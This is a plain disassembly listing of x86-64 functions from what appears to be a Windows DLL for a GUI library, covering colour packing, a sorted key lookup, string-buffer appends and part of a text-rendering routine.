   180003bc6:	f3 0f 10 25 ce 7f 04 	movss  0x47fce(%rip),%xmm4        # 0x18004bb9c
   180003bcd:	00 
   180003bce:	f3 0f 10 2d fa 7e 04 	movss  0x47efa(%rip),%xmm5        # 0x18004bad0
   180003bd5:	00 
   180003bd6:	f3 0f 59 d4          	mulss  %xmm4,%xmm2
   180003bda:	f3 0f 59 cc          	mulss  %xmm4,%xmm1
   180003bde:	f3 0f 58 d5          	addss  %xmm5,%xmm2
   180003be2:	f3 0f 58 cd          	addss  %xmm5,%xmm1
   180003be6:	f3 0f 2c d2          	cvttss2si %xmm2,%edx
   180003bea:	f3 0f 10 51 08       	movss  0x8(%rcx),%xmm2
   180003bef:	c1 e2 08             	shl    $0x8,%edx
   180003bf2:	f3 0f 2c c1          	cvttss2si %xmm1,%eax
   180003bf6:	0b d0                	or     %eax,%edx
   180003bf8:	0f 2f c2             	comiss %xmm2,%xmm0
   180003bfb:	76 05                	jbe    0x180003c02
   180003bfd:	0f 57 c9             	xorps  %xmm1,%xmm1
   180003c00:	eb 07                	jmp    0x180003c09
   180003c02:	0f 28 cb             	movaps %xmm3,%xmm1
   180003c05:	f3 0f 5d ca          	minss  %xmm2,%xmm1
   180003c09:	f3 0f 59 cc          	mulss  %xmm4,%xmm1
   180003c0d:	f3 0f 58 cd          	addss  %xmm5,%xmm1
   180003c11:	f3 0f 2c c1          	cvttss2si %xmm1,%eax
   180003c15:	f3 0f 10 49 0c       	movss  0xc(%rcx),%xmm1
   180003c1a:	c1 e0 10             	shl    $0x10,%eax
   180003c1d:	0b d0                	or     %eax,%edx
   180003c1f:	0f 2f c1             	comiss %xmm1,%xmm0
   180003c22:	77 07                	ja     0x180003c2b
   180003c24:	0f 28 c3             	movaps %xmm3,%xmm0
   180003c27:	f3 0f 5d c1          	minss  %xmm1,%xmm0
   180003c2b:	f3 0f 59 c4          	mulss  %xmm4,%xmm0
   180003c2f:	f3 0f 58 c5          	addss  %xmm5,%xmm0
   180003c33:	f3 0f 2c c0          	cvttss2si %xmm0,%eax
   180003c37:	c1 e0 18             	shl    $0x18,%eax
   180003c3a:	0b c2                	or     %edx,%eax
   180003c3c:	c3                   	ret
   180003c3d:	cc                   	int3
   180003c3e:	cc                   	int3
   180003c3f:	cc                   	int3
   180003c40:	48 83 ec 28          	sub    $0x28,%rsp
   180003c44:	48 8b 15 85 91 07 00 	mov    0x79185(%rip),%rdx        # 0x18007cdd0
   180003c4b:	f3 0f 10 2d b1 7e 04 	movss  0x47eb1(%rip),%xmm5        # 0x18004bb04
   180003c52:	00 
   180003c53:	48 63 c1             	movslq %ecx,%rax
   180003c56:	48 83 c0 0b          	add    $0xb,%rax
   180003c5a:	0f 29 74 24 10       	movaps %xmm6,0x10(%rsp)
   180003c5f:	0f 29 3c 24          	movaps %xmm7,(%rsp)
   180003c63:	48 03 c0             	add    %rax,%rax
   180003c66:	0f 28 f9             	movaps %xmm1,%xmm7
   180003c69:	0f 57 c9             	xorps  %xmm1,%xmm1
   180003c6c:	f3 0f 59 ba 58 15 00 	mulss  0x1558(%rdx),%xmm7
   180003c73:	00 
   180003c74:	0f 10 94 c2 58 15 00 	movups 0x1558(%rdx,%rax,8),%xmm2
   180003c7b:	00 
   180003c7c:	0f 2f ca             	comiss %xmm2,%xmm1
   180003c7f:	0f 28 c2             	movaps %xmm2,%xmm0
   180003c82:	0f c6 c2 ff          	shufps $0xff,%xmm2,%xmm0
   180003c86:	f3 0f 59 f8          	mulss  %xmm0,%xmm7
   180003c8a:	76 05                	jbe    0x180003c91
   180003c8c:	0f 57 c0             	xorps  %xmm0,%xmm0
   180003c8f:	eb 07                	jmp    0x180003c98
   180003c91:	0f 28 c5             	movaps %xmm5,%xmm0
   180003c94:	f3 0f 5d c2          	minss  %xmm2,%xmm0
   180003c98:	0f 28 e2             	movaps %xmm2,%xmm4
   180003c9b:	0f c6 e2 55          	shufps $0x55,%xmm2,%xmm4
   180003c9f:	0f 2f cc             	comiss %xmm4,%xmm1
   180003ca2:	76 05                	jbe    0x180003ca9
   180003ca4:	0f 57 db             	xorps  %xmm3,%xmm3
   180003ca7:	eb 07                	jmp    0x180003cb0
   180003ca9:	0f 28 dd             	movaps %xmm5,%xmm3
   180003cac:	f3 0f 5d dc          	minss  %xmm4,%xmm3
   180003cb0:	f3 0f 10 25 e4 7e 04 	movss  0x47ee4(%rip),%xmm4        # 0x18004bb9c
   180003cb7:	00 
   180003cb8:	f3 0f 10 35 10 7e 04 	movss  0x47e10(%rip),%xmm6        # 0x18004bad0
   180003cbf:	00 
   180003cc0:	f3 0f 59 dc          	mulss  %xmm4,%xmm3
   180003cc4:	f3 0f 59 c4          	mulss  %xmm4,%xmm0
   180003cc8:	f3 0f 58 de          	addss  %xmm6,%xmm3
   180003ccc:	0f c6 d2 aa          	shufps $0xaa,%xmm2,%xmm2
   180003cd0:	f3 0f 58 c6          	addss  %xmm6,%xmm0
   180003cd4:	f3 0f 2c cb          	cvttss2si %xmm3,%ecx
   180003cd8:	f3 0f 2c c0          	cvttss2si %xmm0,%eax
   180003cdc:	c1 e1 08             	shl    $0x8,%ecx
   180003cdf:	0b c8                	or     %eax,%ecx
   180003ce1:	0f 2f ca             	comiss %xmm2,%xmm1
   180003ce4:	76 05                	jbe    0x180003ceb
   180003ce6:	0f 57 c0             	xorps  %xmm0,%xmm0
   180003ce9:	eb 07                	jmp    0x180003cf2
   180003ceb:	0f 28 c5             	movaps %xmm5,%xmm0
   180003cee:	f3 0f 5d c2          	minss  %xmm2,%xmm0
   180003cf2:	f3 0f 59 c4          	mulss  %xmm4,%xmm0
   180003cf6:	f3 0f 58 c6          	addss  %xmm6,%xmm0
   180003cfa:	f3 0f 2c c0          	cvttss2si %xmm0,%eax
   180003cfe:	c1 e0 10             	shl    $0x10,%eax
   180003d01:	0b c8                	or     %eax,%ecx
   180003d03:	0f 2f cf             	comiss %xmm7,%xmm1
   180003d06:	77 07                	ja     0x180003d0f
   180003d08:	0f 28 cd             	movaps %xmm5,%xmm1
   180003d0b:	f3 0f 5d cf          	minss  %xmm7,%xmm1
   180003d0f:	0f 28 3c 24          	movaps (%rsp),%xmm7
   180003d13:	f3 0f 59 cc          	mulss  %xmm4,%xmm1
   180003d17:	f3 0f 58 ce          	addss  %xmm6,%xmm1
   180003d1b:	0f 28 74 24 10       	movaps 0x10(%rsp),%xmm6
   180003d20:	f3 0f 2c c1          	cvttss2si %xmm1,%eax
   180003d24:	c1 e0 18             	shl    $0x18,%eax
   180003d27:	0b c1                	or     %ecx,%eax
   180003d29:	48 83 c4 28          	add    $0x28,%rsp
   180003d2d:	c3                   	ret
   180003d2e:	cc                   	int3
   180003d2f:	cc                   	int3
   180003d30:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180003d35:	57                   	push   %rdi
   180003d36:	48 83 ec 30          	sub    $0x30,%rsp
   180003d3a:	4c 63 01             	movslq (%rcx),%r8
   180003d3d:	44 8b d2             	mov    %edx,%r10d
   180003d40:	48 8b 79 08          	mov    0x8(%rcx),%rdi
   180003d44:	4d 8b d8             	mov    %r8,%r11
   180003d47:	4d 03 db             	add    %r11,%r11
   180003d4a:	48 8b d9             	mov    %rcx,%rbx
   180003d4d:	48 8b d7             	mov    %rdi,%rdx
   180003d50:	4d 85 c0             	test   %r8,%r8
   180003d53:	74 3c                	je     0x180003d91
   180003d55:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   180003d5c:	00 00 00 00 
   180003d60:	49 8b c8             	mov    %r8,%rcx
   180003d63:	48 d1 e9             	shr    $1,%rcx
   180003d66:	4c 8b c9             	mov    %rcx,%r9
   180003d69:	4d 03 c9             	add    %r9,%r9
   180003d6c:	46 39 14 ca          	cmp    %r10d,(%rdx,%r9,8)
   180003d70:	73 17                	jae    0x180003d89
   180003d72:	4a 8d 14 ca          	lea    (%rdx,%r9,8),%rdx
   180003d76:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   180003d7d:	48 83 c2 10          	add    $0x10,%rdx
   180003d81:	48 2b c1             	sub    %rcx,%rax
   180003d84:	4c 03 c0             	add    %rax,%r8
   180003d87:	eb 03                	jmp    0x180003d8c
   180003d89:	4c 8b c1             	mov    %rcx,%r8
   180003d8c:	4d 85 c0             	test   %r8,%r8
   180003d8f:	75 cf                	jne    0x180003d60
   180003d91:	4a 8d 04 df          	lea    (%rdi,%r11,8),%rax
   180003d95:	48 3b d0             	cmp    %rax,%rdx
   180003d98:	74 14                	je     0x180003dae
   180003d9a:	44 39 12             	cmp    %r10d,(%rdx)
   180003d9d:	75 0f                	jne    0x180003dae
   180003d9f:	48 8d 42 08          	lea    0x8(%rdx),%rax
   180003da3:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   180003da8:	48 83 c4 30          	add    $0x30,%rsp
   180003dac:	5f                   	pop    %rdi
   180003dad:	c3                   	ret
   180003dae:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   180003db3:	44 89 54 24 20       	mov    %r10d,0x20(%rsp)
   180003db8:	48 8b cb             	mov    %rbx,%rcx
   180003dbb:	c7 44 24 28 ff ff ff 	movl   $0xffffffff,0x28(%rsp)
   180003dc2:	ff 
   180003dc3:	e8 68 3c 01 00       	call   0x180017a30
   180003dc8:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   180003dcd:	48 83 c0 08          	add    $0x8,%rax
   180003dd1:	48 83 c4 30          	add    $0x30,%rsp
   180003dd5:	5f                   	pop    %rdi
   180003dd6:	c3                   	ret
   180003dd7:	cc                   	int3
   180003dd8:	cc                   	int3
   180003dd9:	cc                   	int3
   180003dda:	cc                   	int3
   180003ddb:	cc                   	int3
   180003ddc:	cc                   	int3
   180003ddd:	cc                   	int3
   180003dde:	cc                   	int3
   180003ddf:	cc                   	int3
   180003de0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180003de5:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   180003dea:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   180003def:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   180003df4:	41 56                	push   %r14
   180003df6:	48 83 ec 20          	sub    $0x20,%rsp
   180003dfa:	49 8b f0             	mov    %r8,%rsi
   180003dfd:	48 8b fa             	mov    %rdx,%rdi
   180003e00:	4c 8b f1             	mov    %rcx,%r14
   180003e03:	4d 85 c0             	test   %r8,%r8
   180003e06:	74 04                	je     0x180003e0c
   180003e08:	2b f7                	sub    %edi,%esi
   180003e0a:	eb 12                	jmp    0x180003e1e
   180003e0c:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   180003e13:	48 ff c0             	inc    %rax
   180003e16:	80 3c 02 00          	cmpb   $0x0,(%rdx,%rax,1)
   180003e1a:	75 f7                	jne    0x180003e13
   180003e1c:	8b f0                	mov    %eax,%esi
   180003e1e:	8b 01                	mov    (%rcx),%eax
   180003e20:	bd 01 00 00 00       	mov    $0x1,%ebp
   180003e25:	8b 51 04             	mov    0x4(%rcx),%edx
   180003e28:	85 c0                	test   %eax,%eax
   180003e2a:	0f 45 e8             	cmovne %eax,%ebp
   180003e2d:	8d 1c 2e             	lea    (%rsi,%rbp,1),%ebx
   180003e30:	3b da                	cmp    %edx,%ebx
   180003e32:	7c 0c                	jl     0x180003e40
   180003e34:	03 d2                	add    %edx,%edx
   180003e36:	3b da                	cmp    %edx,%ebx
   180003e38:	0f 4f d3             	cmovg  %ebx,%edx
   180003e3b:	e8 50 3d 01 00       	call   0x180017b90
   180003e40:	41 8b 4e 04          	mov    0x4(%r14),%ecx
   180003e44:	3b d9                	cmp    %ecx,%ebx
   180003e46:	7e 23                	jle    0x180003e6b
   180003e48:	85 c9                	test   %ecx,%ecx
   180003e4a:	74 0b                	je     0x180003e57
   180003e4c:	8b c1                	mov    %ecx,%eax
   180003e4e:	99                   	cltd
   180003e4f:	2b c2                	sub    %edx,%eax
   180003e51:	d1 f8                	sar    $1,%eax
   180003e53:	03 c1                	add    %ecx,%eax
   180003e55:	eb 05                	jmp    0x180003e5c
   180003e57:	b8 08 00 00 00       	mov    $0x8,%eax
   180003e5c:	3b c3                	cmp    %ebx,%eax
   180003e5e:	8b d3                	mov    %ebx,%edx
   180003e60:	49 8b ce             	mov    %r14,%rcx
   180003e63:	0f 4f d0             	cmovg  %eax,%edx
   180003e66:	e8 25 3d 01 00       	call   0x180017b90
   180003e6b:	ff cd                	dec    %ebp
   180003e6d:	41 89 1e             	mov    %ebx,(%r14)
   180003e70:	3b eb                	cmp    %ebx,%ebp
   180003e72:	7c 1a                	jl     0x180003e8e
   180003e74:	41 b8 f8 04 00 00    	mov    $0x4f8,%r8d
   180003e7a:	48 8d 15 cf d8 03 00 	lea    0x3d8cf(%rip),%rdx        # 0x180041750
   180003e81:	48 8d 0d d0 04 04 00 	lea    0x404d0(%rip),%rcx        # 0x180044358
   180003e88:	ff 15 02 d6 03 00    	call   *0x3d602(%rip)        # 0x180041490
   180003e8e:	48 63 cd             	movslq %ebp,%rcx
   180003e91:	48 8b d7             	mov    %rdi,%rdx
   180003e94:	49 03 4e 08          	add    0x8(%r14),%rcx
   180003e98:	4c 63 c6             	movslq %esi,%r8
   180003e9b:	e8 aa be 03 00       	call   0x18003fd4a
   180003ea0:	8d 43 ff             	lea    -0x1(%rbx),%eax
   180003ea3:	41 3b 06             	cmp    (%r14),%eax
   180003ea6:	7c 1a                	jl     0x180003ec2
   180003ea8:	41 b8 f8 04 00 00    	mov    $0x4f8,%r8d
   180003eae:	48 8d 15 9b d8 03 00 	lea    0x3d89b(%rip),%rdx        # 0x180041750
   180003eb5:	48 8d 0d 9c 04 04 00 	lea    0x4049c(%rip),%rcx        # 0x180044358
   180003ebc:	ff 15 ce d5 03 00    	call   *0x3d5ce(%rip)        # 0x180041490
   180003ec2:	49 8b 46 08          	mov    0x8(%r14),%rax
   180003ec6:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   180003ecb:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   180003ed0:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   180003ed5:	48 63 cb             	movslq %ebx,%rcx
   180003ed8:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180003edd:	c6 44 01 ff 00       	movb   $0x0,-0x1(%rcx,%rax,1)
   180003ee2:	48 83 c4 20          	add    $0x20,%rsp
   180003ee6:	41 5e                	pop    %r14
   180003ee8:	c3                   	ret
   180003ee9:	cc                   	int3
   180003eea:	cc                   	int3
   180003eeb:	cc                   	int3
   180003eec:	cc                   	int3
   180003eed:	cc                   	int3
   180003eee:	cc                   	int3
   180003eef:	cc                   	int3
   180003ef0:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   180003ef5:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   180003efa:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   180003eff:	48 83 ec 28          	sub    $0x28,%rsp
   180003f03:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   180003f08:	e8 13 00 00 00       	call   0x180003f20
   180003f0d:	48 83 c4 28          	add    $0x28,%rsp
   180003f11:	c3                   	ret
   180003f12:	cc                   	int3
   180003f13:	cc                   	int3
   180003f14:	cc                   	int3
   180003f15:	cc                   	int3
   180003f16:	cc                   	int3
   180003f17:	cc                   	int3
   180003f18:	cc                   	int3
   180003f19:	cc                   	int3
   180003f1a:	cc                   	int3
   180003f1b:	cc                   	int3
   180003f1c:	cc                   	int3
   180003f1d:	cc                   	int3
   180003f1e:	cc                   	int3
   180003f1f:	cc                   	int3
   180003f20:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   180003f25:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   180003f2a:	41 54                	push   %r12
   180003f2c:	41 56                	push   %r14
   180003f2e:	41 57                	push   %r15
   180003f30:	48 83 ec 30          	sub    $0x30,%rsp
   180003f34:	4d 8b f0             	mov    %r8,%r14
   180003f37:	4c 8b fa             	mov    %rdx,%r15
   180003f3a:	48 8b f9             	mov    %rcx,%rdi
   180003f3d:	e8 4e e4 ff ff       	call   0x180002390
   180003f42:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
   180003f47:	4d 8b cf             	mov    %r15,%r9
   180003f4a:	45 33 c0             	xor    %r8d,%r8d
   180003f4d:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   180003f54:	00 00 
   180003f56:	33 d2                	xor    %edx,%edx
   180003f58:	4c 8b e0             	mov    %rax,%r12
   180003f5b:	48 8b 08             	mov    (%rax),%rcx
   180003f5e:	48 83 c9 01          	or     $0x1,%rcx
   180003f62:	ff 15 58 d5 03 00    	call   *0x3d558(%rip)        # 0x1800414c0
   180003f68:	8b e8                	mov    %eax,%ebp
   180003f6a:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   180003f6f:	85 ed                	test   %ebp,%ebp
   180003f71:	0f 48 e8             	cmovs  %eax,%ebp
   180003f74:	85 ed                	test   %ebp,%ebp
   180003f76:	0f 8e da 00 00 00    	jle    0x180004056
   180003f7c:	8b 0f                	mov    (%rdi),%ecx
   180003f7e:	85 c9                	test   %ecx,%ecx
   180003f80:	8b 57 04             	mov    0x4(%rdi),%edx
   180003f83:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   180003f88:	48 89 74 24 58       	mov    %rsi,0x58(%rsp)
   180003f8d:	be 01 00 00 00       	mov    $0x1,%esi
   180003f92:	0f 45 f1             	cmovne %ecx,%esi
   180003f95:	8d 1c 2e             	lea    (%rsi,%rbp,1),%ebx
   180003f98:	3b da                	cmp    %edx,%ebx
   180003f9a:	7c 0f                	jl     0x180003fab
   180003f9c:	03 d2                	add    %edx,%edx
   180003f9e:	48 8b cf             	mov    %rdi,%rcx
   180003fa1:	3b da                	cmp    %edx,%ebx
   180003fa3:	0f 4f d3             	cmovg  %ebx,%edx
   180003fa6:	e8 e5 3b 01 00       	call   0x180017b90
   180003fab:	8b 4f 04             	mov    0x4(%rdi),%ecx
   180003fae:	3b d9                	cmp    %ecx,%ebx
   180003fb0:	7e 23                	jle    0x180003fd5
   180003fb2:	85 c9                	test   %ecx,%ecx
   180003fb4:	74 0b                	je     0x180003fc1
   180003fb6:	8b c1                	mov    %ecx,%eax
   180003fb8:	99                   	cltd
   180003fb9:	2b c2                	sub    %edx,%eax
   180003fbb:	d1 f8                	sar    $1,%eax
   180003fbd:	03 c1                	add    %ecx,%eax
   180003fbf:	eb 05                	jmp    0x180003fc6
   180003fc1:	b8 08 00 00 00       	mov    $0x8,%eax
   180003fc6:	3b c3                	cmp    %ebx,%eax
   180003fc8:	8b d3                	mov    %ebx,%edx
   180003fca:	48 8b cf             	mov    %rdi,%rcx
   180003fcd:	0f 4f d0             	cmovg  %eax,%edx
   180003fd0:	e8 bb 3b 01 00       	call   0x180017b90
   180003fd5:	ff ce                	dec    %esi
   180003fd7:	89 1f                	mov    %ebx,(%rdi)
   180003fd9:	3b f3                	cmp    %ebx,%esi
   180003fdb:	7c 1a                	jl     0x180003ff7
   180003fdd:	41 b8 f8 04 00 00    	mov    $0x4f8,%r8d
   180003fe3:	48 8d 15 66 d7 03 00 	lea    0x3d766(%rip),%rdx        # 0x180041750
   180003fea:	48 8d 0d 67 03 04 00 	lea    0x40367(%rip),%rcx        # 0x180044358
   180003ff1:	ff 15 99 d4 03 00    	call   *0x3d499(%rip)        # 0x180041490
   180003ff7:	48 8b 7f 08          	mov    0x8(%rdi),%rdi
   180003ffb:	4d 8b cf             	mov    %r15,%r9
   180003ffe:	48 63 ce             	movslq %esi,%rcx
   180004001:	48 03 f9             	add    %rcx,%rdi
   180004004:	48 63 dd             	movslq %ebp,%rbx
   180004007:	49 8b 0c 24          	mov    (%r12),%rcx
   18000400b:	48 ff c3             	inc    %rbx
   18000400e:	48 83 c9 01          	or     $0x1,%rcx
   180004012:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
   180004017:	4c 8b c3             	mov    %rbx,%r8
   18000401a:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   180004021:	00 00 
   180004023:	48 8b d7             	mov    %rdi,%rdx
   180004026:	ff 15 94 d4 03 00    	call   *0x3d494(%rip)        # 0x1800414c0
   18000402c:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   180004031:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
   180004036:	85 c0                	test   %eax,%eax
   180004038:	0f 48 c1             	cmovs  %ecx,%eax
   18000403b:	48 85 ff             	test   %rdi,%rdi
   18000403e:	74 11                	je     0x180004051
   180004040:	3b c1                	cmp    %ecx,%eax
   180004042:	74 04                	je     0x180004048
   180004044:	3b c3                	cmp    %ebx,%eax
   180004046:	7c 03                	jl     0x18000404b
   180004048:	8d 43 ff             	lea    -0x1(%rbx),%eax
   18000404b:	48 98                	cltq
   18000404d:	c6 04 38 00          	movb   $0x0,(%rax,%rdi,1)
   180004051:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   180004056:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   18000405b:	48 8b 7c 24 68       	mov    0x68(%rsp),%rdi
   180004060:	48 83 c4 30          	add    $0x30,%rsp
   180004064:	41 5f                	pop    %r15
   180004066:	41 5e                	pop    %r14
   180004068:	41 5c                	pop    %r12
   18000406a:	c3                   	ret
   18000406b:	cc                   	int3
   18000406c:	cc                   	int3
   18000406d:	cc                   	int3
   18000406e:	cc                   	int3
   18000406f:	cc                   	int3
   180004070:	40 53                	rex push %rbx
   180004072:	55                   	push   %rbp
   180004073:	57                   	push   %rdi
   180004074:	41 55                	push   %r13
   180004076:	41 56                	push   %r14
   180004078:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
   18000407f:	4c 8b 35 4a 8d 07 00 	mov    0x78d4a(%rip),%r14        # 0x18007cdd0
   180004086:	45 84 c9             	test   %r9b,%r9b
   180004089:	44 0f 29 4c 24 70    	movaps %xmm9,0x70(%rsp)
   18000408f:	48 8b ea             	mov    %rdx,%rbp
   180004092:	66 4c 0f 6e c9       	movq   %rcx,%xmm9
   180004097:	4d 8b ee             	mov    %r14,%r13
   18000409a:	f2 44 0f 11 4c 24 50 	movsd  %xmm9,0x50(%rsp)
   1800040a1:	49 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%r9
   1800040a8:	49 8b be 18 1a 00 00 	mov    0x1a18(%r14),%rdi
   1800040af:	74 30                	je     0x1800040e1
   1800040b1:	48 8b da             	mov    %rdx,%rbx
   1800040b4:	4d 85 c0             	test   %r8,%r8
   1800040b7:	49 8b d1             	mov    %r9,%rdx
   1800040ba:	49 0f 45 d0          	cmovne %r8,%rdx
   1800040be:	48 3b da             	cmp    %rdx,%rbx
   1800040c1:	73 3f                	jae    0x180004102
   1800040c3:	0f b6 0b             	movzbl (%rbx),%ecx
   1800040c6:	84 c9                	test   %cl,%cl
   1800040c8:	74 38                	je     0x180004102
   1800040ca:	48 8d 43 01          	lea    0x1(%rbx),%rax
   1800040ce:	80 f9 23             	cmp    $0x23,%cl
   1800040d1:	75 04                	jne    0x1800040d7
   1800040d3:	38 08                	cmp    %cl,(%rax)
   1800040d5:	74 2b                	je     0x180004102
   1800040d7:	48 8b d8             	mov    %rax,%rbx
   1800040da:	48 3b c2             	cmp    %rdx,%rax
   1800040dd:	72 e4                	jb     0x1800040c3
   1800040df:	eb 21                	jmp    0x180004102
   1800040e1:	4d 85 c0             	test   %r8,%r8
   1800040e4:	75 19                	jne    0x1800040ff
   1800040e6:	49 8b c1             	mov    %r9,%rax
   1800040e9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1800040f0:	80 7c 10 01 00       	cmpb   $0x0,0x1(%rax,%rdx,1)
   1800040f5:	48 8d 40 01          	lea    0x1(%rax),%rax
   1800040f9:	75 f5                	jne    0x1800040f0
   1800040fb:	4c 8d 04 10          	lea    (%rax,%rdx,1),%r8
   1800040ff:	49 8b d8             	mov    %r8,%rbx
   180004102:	48 3b eb             	cmp    %rbx,%rbp
   180004105:	0f 84 e1 02 00 00    	je     0x1800043ec
   18000410b:	f3 0f 10 0d f1 79 04 	movss  0x479f1(%rip),%xmm1        # 0x18004bb04
   180004112:	00 
   180004113:	33 c9                	xor    %ecx,%ecx
   180004115:	48 8b bf a8 02 00 00 	mov    0x2a8(%rdi),%rdi
   18000411c:	48 89 b4 24 d8 00 00 	mov    %rsi,0xd8(%rsp)
   180004123:	00 
   180004124:	4c 89 a4 24 e0 00 00 	mov    %r12,0xe0(%rsp)
   18000412b:	00 
   18000412c:	4c 89 bc 24 e8 00 00 	mov    %r15,0xe8(%rsp)
   180004133:	00 
   180004134:	0f 29 bc 24 80 00 00 	movaps %xmm7,0x80(%rsp)
   18000413b:	00 
   18000413c:	e8 ff fa ff ff       	call   0x180003c40
   180004141:	f3 41 0f 10 be 10 19 	movss  0x1910(%r14),%xmm7
   180004148:	00 00 
   18000414a:	44 8b e0             	mov    %eax,%r12d
   18000414d:	49 8b b6 08 19 00 00 	mov    0x1908(%r14),%rsi
   180004154:	4c 8b fb             	mov    %rbx,%r15
   180004157:	a9 00 00 00 ff       	test   $0xff000000,%eax
   18000415c:	0f 84 1c 01 00 00    	je     0x18000427e
   180004162:	48 85 db             	test   %rbx,%rbx
   180004165:	75 22                	jne    0x180004189
   180004167:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   18000416e:	00 00 
   180004170:	41 80 7c 29 01 00    	cmpb   $0x0,0x1(%r9,%rbp,1)
   180004176:	4d 8d 49 01          	lea    0x1(%r9),%r9
   18000417a:	75 f4                	jne    0x180004170
   18000417c:	4d 8d 3c 29          	lea    (%r9,%rbp,1),%r15
   180004180:	49 3b ef             	cmp    %r15,%rbp
   180004183:	0f 84 f5 00 00 00    	je     0x18000427e
   180004189:	0f 29 b4 24 90 00 00 	movaps %xmm6,0x90(%rsp)
   180004190:	00 
   180004191:	48 85 f6             	test   %rsi,%rsi
   180004194:	75 08                	jne    0x18000419e
   180004196:	48 8b 47 38          	mov    0x38(%rdi),%rax
   18000419a:	48 8b 70 08          	mov    0x8(%rax),%rsi
   18000419e:	0f 57 f6             	xorps  %xmm6,%xmm6
   1800041a1:	0f 2e fe             	ucomiss %xmm6,%xmm7
   1800041a4:	7a 0b                	jp     0x1800041b1
   1800041a6:	75 09                	jne    0x1800041b1
   1800041a8:	48 8b 47 38          	mov    0x38(%rdi),%rax
   1800041ac:	f3 0f 10 78 10       	movss  0x10(%rax),%xmm7
   1800041b1:	83 7f 70 00          	cmpl   $0x0,0x70(%rdi)
   1800041b5:	7f 1a                	jg     0x1800041d1
   1800041b7:	41 b8 02 05 00 00    	mov    $0x502,%r8d
   1800041bd:	48 8d 15 8c d5 03 00 	lea    0x3d58c(%rip),%rdx        # 0x180041750
   1800041c4:	48 8d 0d a5 01 04 00 	lea    0x401a5(%rip),%rcx        # 0x180044370
   1800041cb:	ff 15 bf d2 03 00    	call   *0x3d2bf(%rip)        # 0x180041490
   1800041d1:	48 63 57 70          	movslq 0x70(%rdi),%rdx
   1800041d5:	48 8b 47 78          	mov    0x78(%rdi),%rax
   1800041d9:	48 8b 4e 48          	mov    0x48(%rsi),%rcx
   1800041dd:	48 8b 44 d0 f8       	mov    -0x8(%rax,%rdx,8),%rax
   1800041e2:	48 39 41 08          	cmp    %rax,0x8(%rcx)
   1800041e6:	74 1a                	je     0x180004202
   1800041e8:	41 b8 85 04 00 00    	mov    $0x485,%r8d
   1800041ee:	48 8d 15 bb 49 04 00 	lea    0x449bb(%rip),%rdx        # 0x180048bb0
   1800041f5:	48 8d 0d 54 4b 04 00 	lea    0x44b54(%rip),%rcx        # 0x180048d50
   1800041fc:	ff 15 8e d2 03 00    	call   *0x3d28e(%rip)        # 0x180041490
   180004202:	83 7f 60 00          	cmpl   $0x0,0x60(%rdi)
   180004206:	7f 1a                	jg     0x180004222
   180004208:	41 b8 02 05 00 00    	mov    $0x502,%r8d
   18000420e:	48 8d 15 3b d5 03 00 	lea    0x3d53b(%rip),%rdx        # 0x180041750
   180004215:	48 8d 0d 54 01 04 00 	lea    0x40154(%rip),%rcx        # 0x180044370
   18000421c:	ff 15 6e d2 03 00    	call   *0x3d26e(%rip)        # 0x180041490
   180004222:	48 8b 47 68          	mov    0x68(%rdi),%rax
   180004226:	66 4d 0f 7e c9       	movq   %xmm9,%r9
   18000422b:	4c 63 47 60          	movslq 0x60(%rdi),%r8
   18000422f:	0f 28 d7             	movaps %xmm7,%xmm2
   180004232:	c6 44 24 48 00       	movb   $0x0,0x48(%rsp)
   180004237:	4d 03 c0             	add    %r8,%r8
   18000423a:	f3 0f 11 74 24 40    	movss  %xmm6,0x40(%rsp)
   180004240:	48 8b d7             	mov    %rdi,%rdx
   180004243:	4c 89 7c 24 38       	mov    %r15,0x38(%rsp)
   180004248:	48 8b ce             	mov    %rsi,%rcx
   18000424b:	48 89 6c 24 30       	mov    %rbp,0x30(%rsp)
   180004250:	42 0f 10 44 c0 f0    	movups -0x10(%rax,%r8,8),%xmm0
   180004256:	48 8d 44 24 58       	lea    0x58(%rsp),%rax
   18000425b:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   180004260:	0f 11 44 24 58       	movups %xmm0,0x58(%rsp)
   180004265:	44 89 64 24 20       	mov    %r12d,0x20(%rsp)
   18000426a:	e8 b1 2d 02 00       	call   0x180027020
   18000426f:	4c 8b 35 5a 8b 07 00 	mov    0x78b5a(%rip),%r14        # 0x18007cdd0
   180004276:	0f 28 b4 24 90 00 00 	movaps 0x90(%rsp),%xmm6
   18000427d:	00 
